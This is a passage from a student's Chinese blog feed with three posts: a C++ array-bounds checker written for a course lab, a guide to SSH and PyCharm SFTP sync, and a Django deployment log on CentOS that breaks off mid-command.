        <content type="html"><![CDATA[<h3 id="1-前言"><a href="#1-前言" class="headerlink" title="1.前言"></a>1.前言</h3><p><strong>网络攻防实践先导</strong>，听着名字很高大上吧，正如它的名字那般，它的难度也是非常的大: (。作为一门今年新开的课，属于四门先导课程之一（剩下三门分别是软件工程先导、人工智能先导和忘了叫啥先导）。在上学期选课的时候，110人的课，选了139人，可见其火爆程度，也许是<strong>网络</strong>和<strong>攻防</strong>这两个要素吸引人，所以这门课的第一个实验——<strong>数组越界的检测</strong>，与上述两点看起来似乎没有丝毫关系，但是难度还极大，这就造成了，很多人退课（毕竟才0.5学分）。截止至2022年4月1日02点54分，139的课现在还剩39人…….我捏，有幸忝列其中。这足以看出这门课有多难了吧，接下来我给大家分享一下我写这门课的一些心得与体会吧（主要是写给自己看的，要是有不认识我的人看到了这篇博客，算你厉害🤔）</p><h3 id="2-实验介绍"><a href="#2-实验介绍" class="headerlink" title="2.实验介绍"></a>2.实验介绍</h3><p>实验的要求很简单，编写一个文件checker.cpp，要求实现数组越界的检测。以下是原话：</p><blockquote><p>本次实验自拟了一种类似C语言数组的语法，称为easy C，其仅包含简单的变量声明，算术表达式和数组操作，文件后缀为<code>.ec</code>。本次实验的目的是<strong>使用c++语言编写一个检测程序，检测输入的<code>.ec</code>文件中数组使用的索引值是否超过数组定义的最大长度</strong>。</p></blockquote><p>看起来，似乎很简单，巴特，然并不。</p><h3 id="3-实验分析"><a href="#3-实验分析" class="headerlink" title="3.实验分析"></a>3.实验分析</h3><p>由于使用了自定义的easyc语法，所以逻辑上和我们平时的c语言有些许不同，但是还好，easyc简化很多东西，使其变得和Python语法那般简洁。在easyc中，程序执行被分为两部分：<strong>变量赋值VarDef</strong>（保存在VarDefList） 和 <strong>数组引用ArrayUse</strong>（保存在ArrayUseList），执行顺序上，先执行完所有变量赋值后，再进行数组引用。我们的任务就是，<strong>遍历这两个部分，遍历其中的和数组越界有关的表达式，并判断其是否越界</strong>。在存储结构中，变量的定义和数组的引用大量的用到了树结构，如下图：</p><p><img src="https://s2.loli.net/2022/04/01/rudhv5mA3Dit7f9.png"></p><p><img src="https://s2.loli.net/2022/04/01/njyuRsqIr98kltP.png"></p><p>上图中<code>VarDefList</code>元素从0开始，长度为3，表示图中从左至右3个变量的定义语句，<code>ArrayUseList</code>元素从0开始，长度为4，表示图中从左至右4个表达式语句。</p><p>然后，这个checker文件里面，定义了四种结构体，分别是<code>ArrExpr</code>、<code>Expression</code>、<code>ArrayUse</code>和<code>VarDef</code>,这四个结构体就是整个实验要操作的对象，</p><p><code>ArrExpr</code>结构体定义了数组表达式：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">ArrExpr</span>&#123;</span><br><span class="line">    std::string id;</span><br><span class="line">    <span class="type">int</span> dimension;</span><br><span class="line">    std::vector&lt;<span class="keyword">struct</span> Expression*&gt; length;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><code>Expression</code>表达表达式结构:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">Expression</span>&#123;</span><br><span class="line">    <span class="type">int</span> grammartype;</span><br><span class="line">    std::string id;</span><br><span class="line">    std::string op;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">ArrExpr</span> *arrexpr;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">Expression</span>* expr;</span><br><span class="line">    std::string digitsequence;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><code>ArrayUse</code>代表数组的使用:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">struct ArrayUse&#123;</span><br><span class="line">    int grammartype;</span><br><span class="line">    struct ArrExpr *arrexpr;</span><br><span class="line">    struct Expression *expression;</span><br><span class="line">    std::string id;</span><br><span class="line">    std::string op;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><code>VarDef</code>表示变量的定义:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">struct VarDef&#123;</span><br><span class="line">    int grammartype;</span><br><span class="line">    std::string id;</span><br><span class="line">    int dimension;</span><br><span class="line">    std::vector&lt;struct Expression*&gt; length;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这些大概就是题目的信息了，对我们来说，难点有以下这些：</p><ul><li><p>对C++的函数和语法不熟悉（大一限定）</p></li><li><p>对C++的vector容器用法的不熟悉（大一限定）</p></li><li><p>对树和栈概念的不熟悉（大一限定）</p></li><li><p>计算Expression的值</p></li><li><p>调试需要在linux下进行，报错信息极少（不会用Linux下调试限定）</p></li><li><p>别的科目占用时间较多</p></li><li><p>懒…….</p></li></ul><p>可以看到，这个实验对大一来说真心不友好。寄！</p><p>不过还好这个实验是面向41个样例进行的编程，不用考虑过多情况。</p><h3 id="4-实验部分代码展示"><a href="#4-实验部分代码展示" class="headerlink" title="4.实验部分代码展示"></a>4.实验部分代码展示</h3><p>这个实验最难的部分是实现Expression的计算，因为这个Expression是可以嵌套调用的，所以需要用到栈的知识，这里我选择使用使用递归函数解决，因为所有的表达式，进行拆分，最后的结果只能是：<strong>常数</strong>，<strong>数组的引用</strong> 和 <strong>变量的引用</strong> 三个中的其中一个，所以只要以这三种结果为递归函数的出口，就可以实现EXpression的计算了。</p><p>我编写的计算Expression的calc函数:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">calc</span><span class="params">(<span class="keyword">struct</span> Expression* exp)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (!checkflag <span class="keyword">and</span> exp-&gt;arrexpr != <span class="literal">NULL</span>)&#123;</span><br><span class="line"><span class="type">int</span> uselen;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j=<span class="number">0</span>;j&lt;exp-&gt;arrexpr-&gt;dimension;j++)&#123;</span><br><span class="line">uselen = <span class="built_in">calc</span>(exp-&gt;arrexpr-&gt;length[j]);<span class="comment">//判断Expression的值是否合法 </span></span><br><span class="line"><span class="keyword">if</span> (uselen &lt; <span class="number">0</span> <span class="keyword">or</span> uselen &gt;= idmap[exp-&gt;arrexpr-&gt;id + <span class="string">&quot;+&quot;</span> + std::<span class="built_in">to_string</span>(j<span class="number">+1</span>)]) checkflag = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!exp-&gt;digitsequence.<span class="built_in">empty</span>() <span class="keyword">and</span> exp-&gt;op.<span class="built_in">empty</span>())&#123;  <span class="comment">//常数的出口 </span></span><br><span class="line"><span class="keyword">return</span> std::<span class="built_in">stoi</span>(exp-&gt;digitsequence);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (!exp-&gt;id.<span class="built_in">empty</span>() <span class="keyword">and</span> exp-&gt;op.<span class="built_in">empty</span>())&#123;<span class="comment">//变量的出口 </span></span><br><span class="line"><span class="keyword">return</span> idmap[exp-&gt;id];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (exp-&gt;arrexpr != <span class="literal">NULL</span> <span class="keyword">and</span> exp-&gt;op.<span class="built_in">empty</span>())&#123;<span class="comment">//数组引用的出口 </span></span><br><span class="line">std::string id;</span><br><span class="line">id = exp-&gt;arrexpr-&gt;id;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j=<span class="number">0</span>; j &lt; exp-&gt;arrexpr-&gt;dimension ; j++)&#123;</span><br><span class="line">id += <span class="string">&quot;_&quot;</span> + std::<span class="built_in">to_string</span>(<span class="built_in">calc</span>(exp-&gt;arrexpr-&gt;length[j]));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> idmap[id];</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="comment">//由于没有考虑算数优先级，所以每种符号的引用方式是相同的，可以扩展到无穷多种符号 </span></span><br><span class="line"><span class="keyword">if</span> (exp-&gt;op == <span class="string">&quot;+&quot;</span>)&#123;</span><br><span class="line"><span class="keyword">if</span> (!exp-&gt;digitsequence.<span class="built_in">empty</span>()) <span class="keyword">return</span> std::<span class="built_in">stoi</span>(exp-&gt;digitsequence) + <span class="built_in">calc</span>(exp-&gt;expr);   <span class="comment">//常数 </span></span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (!exp-&gt;id.<span class="built_in">empty</span>()) <span class="keyword">return</span> idmap[exp-&gt;id] + <span class="built_in">calc</span>(exp-&gt;expr);   <span class="comment">//变量 </span></span><br><span class="line"><span class="keyword">else</span>&#123;      <span class="comment">//数组 </span></span><br><span class="line">std::string id;</span><br><span class="line">id = exp-&gt;arrexpr-&gt;id;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j=<span class="number">0</span>; j &lt; exp-&gt;arrexpr-&gt;dimension ; j++) &#123;</span><br><span class="line">id += <span class="string">&quot;_&quot;</span> + std::<span class="built_in">to_string</span>(<span class="built_in">calc</span>(exp-&gt;arrexpr-&gt;length[j]));&#125;</span><br><span class="line"><span class="keyword">return</span> idmap[id] + <span class="built_in">calc</span>(exp-&gt;expr);</span><br><span class="line">&#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (exp-&gt;op == <span class="string">&quot;-&quot;</span>)&#123;</span><br><span class="line">                      <span class="keyword">if</span> (!exp-&gt;digitsequence.<span class="built_in">empty</span>()) <span class="keyword">return</span> std::<span class="built_in">stoi</span>(exp-&gt;digitsequence) - <span class="built_in">calc</span>(exp-&gt;expr);</span><br><span class="line">                      <span class="keyword">else</span> <span class="keyword">if</span> (!exp-&gt;id.<span class="built_in">empty</span>()) <span class="keyword">return</span> idmap[exp-&gt;id] - <span class="built_in">calc</span>(exp-&gt;expr);</span><br><span class="line">                      <span class="keyword">else</span>&#123; </span><br><span class="line">                                std::string id;</span><br><span class="line">                                id = exp-&gt;arrexpr-&gt;id;</span><br><span class="line">                                <span class="keyword">for</span> (<span class="type">int</span> j=<span class="number">0</span>; j &lt; exp-&gt;arrexpr-&gt;dimension ; j++) id += <span class="string">&quot;_&quot;</span> + std::<span class="built_in">to_string</span>(<span class="built_in">calc</span>(exp-&gt;arrexpr-&gt;length[j]));</span><br><span class="line">                                <span class="keyword">return</span> idmap[id] - <span class="built_in">calc</span>(exp-&gt;expr);</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">              &#125;</span><br><span class="line">              <span class="keyword">else</span> <span class="keyword">if</span> (exp-&gt;op == <span class="string">&quot;*&quot;</span>)&#123;</span><br><span class="line">                      <span class="keyword">if</span> (!exp-&gt;digitsequence.<span class="built_in">empty</span>()) <span class="keyword">return</span> std::<span class="built_in">stoi</span>(exp-&gt;digitsequence) * <span class="built_in">calc</span>(exp-&gt;expr);</span><br><span class="line">                      <span class="keyword">else</span> <span class="keyword">if</span> (!exp-&gt;id.<span class="built_in">empty</span>()) <span class="keyword">return</span> idmap[exp-&gt;id] * <span class="built_in">calc</span>(exp-&gt;expr);</span><br><span class="line">                      <span class="keyword">else</span>&#123; </span><br><span class="line">                                std::string id;</span><br><span class="line">                                id = exp-&gt;arrexpr-&gt;id;</span><br><span class="line">                                <span class="keyword">for</span> (<span class="type">int</span> j=<span class="number">0</span>; j &lt; exp-&gt;arrexpr-&gt;dimension ; j++) id += <span class="string">&quot;_&quot;</span> + std::<span class="built_in">to_string</span>(<span class="built_in">calc</span>(exp-&gt;arrexpr-&gt;length[j]));</span><br><span class="line"><span class="keyword">return</span> idmap[id] * <span class="built_in">calc</span>(exp-&gt;expr);</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">              &#125;</span><br><span class="line">              <span class="keyword">else</span> <span class="keyword">if</span> (exp-&gt;op == <span class="string">&quot;/&quot;</span>)&#123;</span><br><span class="line">                      <span class="keyword">if</span> (!exp-&gt;digitsequence.<span class="built_in">empty</span>()) <span class="keyword">return</span> std::<span class="built_in">stoi</span>(exp-&gt;digitsequence) / <span class="built_in">calc</span>(exp-&gt;expr);</span><br><span class="line">                      <span class="keyword">else</span> <span class="keyword">if</span> (!exp-&gt;id.<span class="built_in">empty</span>()) <span class="keyword">return</span> idmap[exp-&gt;id] / <span class="built_in">calc</span>(exp-&gt;expr);</span><br><span class="line">                      <span class="keyword">else</span>&#123; </span><br><span class="line">                                std::string id;</span><br><span class="line">                                id = exp-&gt;arrexpr-&gt;id;</span><br><span class="line">                                <span class="keyword">for</span> (<span class="type">int</span> j=<span class="number">0</span>; j &lt; exp-&gt;arrexpr-&gt;dimension ; j++) id += <span class="string">&quot;_&quot;</span> + std::<span class="built_in">to_string</span>(<span class="built_in">calc</span>(exp-&gt;arrexpr-&gt;length[j]));</span><br><span class="line">                                <span class="keyword">return</span> idmap[id] / <span class="built_in">calc</span>(exp-&gt;expr);</span><br><span class="line">                        &#125;</span><br><span class="line"> </span><br><span class="line">              &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>目前已知的问题：没有考虑算数优先级，所以计算出来的结果不一定正确。</p><p>checker函数：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">std::map&lt;std::string, <span class="type">int</span>&gt; idmap;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">calc</span><span class="params">(<span class="keyword">struct</span> Expression* exp)</span></span>;</span><br><span class="line"><span class="type">bool</span> checkflag = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">checker</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; ArrayUseList.<span class="built_in">size</span>(); ++i) &#123;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">ArrayUse</span>* arruse = ArrayUseList[i];</span><br><span class="line">    <span class="keyword">if</span> (arruse-&gt;arrexpr == <span class="literal">NULL</span>)&#123;</span><br><span class="line">    idmap[arruse-&gt;id] = std::<span class="built_in">stoi</span>(arruse-&gt;expression-&gt;digitsequence);</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;  <span class="comment">//在数组定义之前，先进行变量的赋值，防止出现定义时变量值未知的情况 </span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; VarDefList.<span class="built_in">size</span>(); ++i) &#123;</span><br><span class="line">        <span class="keyword">struct</span> <span class="title class_">VarDef</span> *def = VarDefList[i];</span><br><span class="line">std::string id;</span><br><span class="line"><span class="keyword">if</span> (def-&gt;dimension == <span class="number">0</span>)&#123;    <span class="comment">//变量定义 </span></span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; def-&gt;dimension;j++)&#123;     <span class="comment">//数组定义 </span></span><br><span class="line">idmap[def-&gt;id + <span class="string">&quot;+&quot;</span> + std::<span class="built_in">to_string</span>(j<span class="number">+1</span>)] = <span class="built_in">calc</span>(def-&gt;length[j]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//变量和数组定义 </span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; ArrayUseList.<span class="built_in">size</span>(); ++i) &#123;</span><br><span class="line">        <span class="keyword">struct</span> <span class="title class_">ArrayUse</span>* arruse = ArrayUseList[i];</span><br><span class="line"><span class="type">int</span> uselen = <span class="number">0</span>;</span><br><span class="line">        std::string id;</span><br><span class="line"><span class="keyword">if</span> (checkflag == <span class="literal">true</span>) <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (arruse-&gt;arrexpr == <span class="literal">NULL</span>)&#123;       <span class="comment">//变量的赋值 </span></span><br><span class="line">id = arruse-&gt;id;</span><br><span class="line">idmap[id] = std::<span class="built_in">stoi</span>(arruse-&gt;expression-&gt;digitsequence);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>&#123;    <span class="comment">//数组的引用 </span></span><br><span class="line">id = arruse-&gt;arrexpr-&gt;id;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j=<span class="number">0</span>;j&lt;arruse-&gt;arrexpr-&gt;dimension;j++)&#123;</span><br><span class="line"></span><br><span class="line">uselen = <span class="built_in">calc</span>(arruse-&gt;arrexpr-&gt;length[j]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (checkflag <span class="keyword">or</span> uselen &lt; <span class="number">0</span> <span class="keyword">or</span> uselen &gt;= idmap[arruse-&gt;arrexpr-&gt;id + <span class="string">&quot;+&quot;</span> + std::<span class="built_in">to_string</span>(j<span class="number">+1</span>)])&#123;</span><br><span class="line">checkflag = <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">break</span>;    <span class="comment">//判断数组是否越界（其索引值是否为负数或者超出定义值） </span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">id += <span class="string">&quot;_&quot;</span> + std::<span class="built_in">to_string</span>(<span class="built_in">calc</span>(arruse-&gt;arrexpr-&gt;length[j]));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (checkflag) <span class="keyword">break</span>;</span><br><span class="line">idmap[id] = <span class="built_in">calc</span>(arruse-&gt;expression);<span class="comment">//将合法的数组赋值添加到映射表中，以便接下来引用</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> &#125;</span><br><span class="line">    <span class="keyword">if</span> (checkflag == <span class="literal">false</span>)&#123;</span><br><span class="line">    std::cout&lt;&lt;<span class="string">&quot;Correct&quot;</span>&lt;&lt;std::endl;  <span class="comment">//输出结果 </span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> std::cout&lt;&lt;<span class="string">&quot;Out of bound&quot;</span>&lt;&lt;std::endl;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="5-心得"><a href="#5-心得" class="headerlink" title="5.心得"></a>5.心得</h3><p>好难好难好难好难，当时和好兄弟在形策课上激情讨论，然后也没取得啥实质性进展（当天下午就被封校了，现在距离封校都过去了三周，没有啥解封的迹象，焯！），晚上熬了几个大夜，遇到了一堆奇奇怪怪的bug。最恶心的是，直接编译运行，报错信息只有核心错误，这就导致了我Debug的时间比写代码的时间长得多的多的多。这也让我后来跑去学了学怎么在IDE里边打断点调试（之前我都是Print战士，焯）。总之，这次实验还是让我学到不少好东西的，于是就有了这篇一大堆废话的文章（反正也是我自己看的嘻嘻）。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 网络破防实践先导 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      
        <title>用ssh连接服务器和使用pycharm把代码同步上服务器的方法</title>
      
      <link href="/archives/8eb53c55.html"/>
      <url>/archives/8eb53c55.html</url>
      
        <content type="html"><![CDATA[<h4 id="1-SSH连接服务器"><a href="#1-SSH连接服务器" class="headerlink" title="1.SSH连接服务器"></a>1.SSH连接服务器</h4><p>首先需要安装一个远程连接客户端（我用的是Final shell，用别的也行）</p><p><img src="https://s2.loli.net/2022/03/07/DNEoTJ7X569cuAm.png"></p><p>然后在软件里新建一个连接</p><p><img src="https://s2.loli.net/2022/03/07/AVY7gGkNZ4jyixS.png"></p><p>这里，主机名是<strong>服务器的公网IP</strong>，端口默认<strong>22</strong>，底下，使用密码登录，</p><p>连接成功后就可以操作服务器了</p><h4 id="2-用pycharm把代码同步上服务器-需要pycharm专业版"><a href="#2-用pycharm把代码同步上服务器-需要pycharm专业版" class="headerlink" title="2.用pycharm把代码同步上服务器(需要pycharm专业版)"></a>2.用pycharm把代码同步上服务器(需要pycharm专业版)</h4><p>首先打开pycharm专业版（社区版没有这个功能好像），打开项目，左上角选择File–settings</p><p><img src="https://s2.loli.net/2022/03/07/vFUojrapRACKN7s.png"></p><p><img src="https://s2.loli.net/2022/03/07/knEfyd67xel8VYC.png"></p><p>新增一个SFTP连接，然后点右边的SSH configuration的三个点，新增SSH连接</p><p><img src="https://s2.loli.net/2022/03/07/FyE1Ltlp3ZYvuJH.png"></p><p>账号密码同之前SSH远程登录时的账号密码</p><p><img src="https://s2.loli.net/2022/04/23/qyv6kleGCu8ZE7N.png"></p><p>然后重点来了，<strong>接下来这几步不能错，不然可能会把文件覆盖掉</strong></p><p><img src="https://s2.loli.net/2022/04/23/HifCqLdg5FAjSNZ.png"></p><p>首先在Root path中，选择你想要的根目录，之后在Web server URL处填入你的远程服务器地址。</p><p>然后选择上方Mappings栏</p><p><img src="https://s2.loli.net/2022/04/23/WamQCOVPYjN8xbe.png"></p><p>本地路径设置，这里就设置你<strong>本地的Django项目的路径（就是manage.py的路径）</strong></p><p><img src="https://s2.loli.net/2022/03/07/qXWIwHMOrQZ2keo.png"></p><p>配置完成后，点击OK，接下来就是从服务器下载和上传代码</p><p>在pycharm项目的首页，文件树那里，右键，往下滑选择Deployment，里面的下载和上载就是同步操作</p><p><img src="https://s2.loli.net/2022/03/28/J5wfV17e4jFkcvO.png"></p><p>可以通过这个把代码同步上去。上传大概需要几分钟左右即可</p>]]></content>
      
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      
        <title>基于uwsgi+nginx+centos的Django项目部署经历</title>
      
      <link href="/archives/cec14bfd.html"/>
      <url>/archives/cec14bfd.html</url>
      
        <content type="html"><![CDATA[<h3 id="1-起因"><a href="#1-起因" class="headerlink" title="1.起因"></a>1.起因</h3><p>寒假之前，我滴帅部长召哥给我们布置寒假作业：要求我们每个人把上个学期写的电商项目给部署到远程服务器上面。然后他也没告诉我们具体怎么去部署。我就自己在网上找教程，跌跌撞撞摸索出了部署的流程。</p><h3 id="2-选择服务器"><a href="#2-选择服务器" class="headerlink" title="2.选择服务器"></a>2.选择服务器</h3><p>要把Django部署上远程服务器，首先得有一台远程服务器。之前寄导课做实验，给了我们每个人华为云两百大洋的代金券，我才用了几块钱，本来想买华为云的，但是召哥推荐我们买良心云（腾讯云）和套路云（阿里云），然后我就用学生优惠花40大洋买了一年的腾讯云2H2G+40G的轻量应用服务器，性能对我来说还是够用的。</p><p><img src="https://s2.loli.net/2022/03/27/dIckH4XfZ7LbzRF.png"></p><p>镜像我装了centos，至于为什么没用宝塔，主要使我想体验一下比较纯正的服务器体验。</p><h3 id="3-配置环境"><a href="#3-配置环境" class="headerlink" title="3.配置环境"></a>3.配置环境</h3><p>我配置服务器主要参考<a href="https://www.cnblogs.com/lvye001/p/10631276.html">腾讯云服务器部署 django项目整个流程 - lvye001 - 博客园 (cnblogs.com)</a>这篇文章，剩下的细节和问题都是在网上不停搜索解决的。</p><h4 id="1）安装Python3-9-5"><a href="#1）安装Python3-9-5" class="headerlink" title="1）安装Python3.9.5"></a>1）安装Python3.9.5</h4><p>在安装python之前，先升级一下包管理工具，在安装一下可能用到的依赖。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">yum update -y</span><br><span class="line">yum -y groupinstall &quot;Development tools&quot;</span><br><span class="line">yum install openssl-devel bzip2-devel expat-devel gdbm-devel readline-devel sqlite-devel</span><br></pre></td></tr></table></figure><p>然后再进入&#x2F;usr&#x2F;local路径下，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd /usr/local</span><br></pre></td></tr></table></figure><p>下载Python3.9.5到&#x2F;usr&#x2F;local目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://www.python.org/ftp/python/3.9.5/Python-3.9.5.tgz</span><br></pre></td></tr></table></figure><p>下载有亿点点慢，耐心等等或者也可以在自己的电脑上<a href="https://www.python.org/ftp/python/3.9.5/Python-3.9.5.tgz">下载</a>好,在上传到服务器上。下载完毕，解压安装</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tar -zxvf Python-3.9.5.tgz</span><br><span class="line">cd Python-3.9.5</span><br></pre></td></tr></table></figure><p>编译安装到指定路径</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./configure --prefix=/usr/local/python3</span><br></pre></td></tr></table></figure><p>&#x2F;usr&#x2F;local&#x2F;python3 路径可以自己指定，自己记着就行，下边要用到。</p><p>安装python3</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure><p>安装完成之后 建立软链接 添加变量 方便在终端中直接使用python3（这一步很重要，可以为后边步骤提供不少便利）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ln -s /usr/local/python3/bin/python3.9 /usr/bin/python3</span><br></pre></td></tr></table></figure><p>Python3安装完成之后pip3也一块安装完成，不需要再单独安装<br>一样建立软链接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ln -s /usr/local/python3/bin/pip3.9 /usr/bin/pip3</span><br></pre></td></tr></table></figure><p>全局环境下安装了Python3.9.5，但是一般Django部署到虚拟环境好一点，方便管理package。安装virtuallenv</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install virtualenv</span><br></pre></td></tr></table></figure><p>建立软连接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ln -s /usr/local/python3/bin/virtualenv 